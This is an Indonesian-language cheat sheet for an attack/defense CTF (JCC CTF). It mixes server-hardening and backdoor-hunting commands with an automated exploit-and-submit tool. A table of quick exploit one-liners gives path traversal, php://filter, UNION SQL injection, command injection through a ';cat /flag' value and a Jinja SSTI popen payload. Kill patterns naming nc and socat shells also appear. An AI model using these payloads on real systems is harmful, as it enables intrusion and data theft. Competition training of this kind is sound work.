# ⚡ ULTIMATE QUICK REFERENCE CARD — JCC CTF A/D

> **1 halaman cheat sheet darurat. Buka ini saat panik.**

---

## 🏁 MENIT 0-2: LOGIN & LOCKDOWN

```bash
passwd                                    # Ganti password SSH
python3 adctf.py start --whitelist IP_JURI # Full auto-defense (backup+hardening+WAF+scan)
python3 adctf.py autopatch                # 1-klik patch LFI/SQLi/RCE
```

## 🤖 MENIT 2+: AKTIFKAN AUTOPILOT

```bash
python3 adctf.py autopilot \
  --targets 10.60.1-20.1 \
  --submit-url http://10.0.0.1/api/submit \
  --token TEAM_TOKEN \
  --pattern "JCSC\{[^\}]+\}"
```

---

## 🔴 DARURAT: SERVER RUSAK / SLA DROP

```bash
python3 adctf.py restore --confirm        # Rollback dari backup
# atau manual:
cd /var/www/html && git checkout .         # Git rollback
systemctl restart nginx php*-fpm          # Restart services
curl -I http://localhost                   # Cek SLA
```

## 🔴 DARURAT: ADA BACKDOOR

```bash
find /var/www -name '*.php' -mmin -10 -ls                    # File baru
find /var/www -name '*.php' -exec grep -l 'eval\|system' {} \; # Backdoor
pkill -9 -f 'nc \|socat\|python.*socket'                     # Kill shell
```

---

## ⚔️ QUICK EXPLOIT COMMANDS

| Jenis | Command |
|---|---|
| **LFI** | `curl "http://T/p.php?file=../../../../flag"` |
| **LFI+PHP** | `curl "http://T/p.php?file=php://filter/convert.base64-encode/resource=/flag"` |
| **SQLi** | `curl "http://T/u.php?id=0 UNION SELECT 1,flag,3 FROM flags-- -"` |
| **RCE** | `curl "http://T/ping.php" -d "ip=;cat /flag"` |
| **SSTI** | `curl 'http://T/h?name={{lipsum.__globals__.os.popen("cat /flag").read()}}'` |
| **Webshell** | `curl "http://T/shell.php?c=cat+/flag"` |

---

## 🛡️ QUICK DEFENSE COMMANDS

| Aksi | Command |
|---|---|
| **Backup DB** | `mysqldump -u root --all-databases > /tmp/db.sql` |
| **Ganti Pass MySQL** | `mysql -u root -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'X';"` |
| **Kill Backdoor** | `pkill -9 -f 'nc -'; pkill -9 -f socat` |
| **Lock Compiler** | `chmod 700 /usr/bin/gcc /usr/bin/nc 2>/dev/null` |
| **Monitor Log** | `tail -f /var/log/nginx/access.log` |
| **Cek SLA** | `curl -s -o /dev/null -w "%{http_code}" http://localhost/` |
| **Restart Nginx** | `nginx -t && systemctl reload nginx` |
| **File Permission** | `find /var/www/html -type f -exec chmod 644 {} \;` |
| **Cari User Asing** | `cat /etc/passwd \| awk -F: '$3>=1000'` |
| **Hapus SSH Key** | `> ~/.ssh/authorized_keys` |

---

## 📂 ADCTF.PY COMMAND CHEAT SHEET

```
python3 adctf.py start           # Full auto-defense pipeline
python3 adctf.py autopilot       # Autonomous radar + replay + submit
python3 adctf.py autopatch       # Auto-fix LFI/SQLi/RCE
python3 adctf.py scan            # Scan source code vulnerabilities
python3 adctf.py next            # Lihat bug berikutnya + cara fix
python3 adctf.py done            # Tandai bug sudah difix
python3 adctf.py webshell        # Cari backdoor
python3 adctf.py watch           # Monitor log real-time
python3 adctf.py check           # Cek SLA health
python3 adctf.py restore         # Rollback dari backup
python3 adctf.py probe -t IP     # Manual exploit probe
python3 adctf.py attack IP       # Replay exploit ke lawan
python3 adctf.py submit          # Submit flag
python3 adctf.py waf             # Generate WAF
python3 adctf.py doctor          # System diagnostic
python3 adctf.py triage          # Quick recon
python3 adctf.py hardening       # Security audit
python3 adctf.py firewall        # UFW setup
python3 adctf.py patch-guide     # Lihat contoh patch code
```

---

## 🎯 FLAG REGEX (COPY-PASTE)

```bash
grep -oP '(FLAG|JCSC|CTF|CYBER|flag)\{[^}]+\}'
```
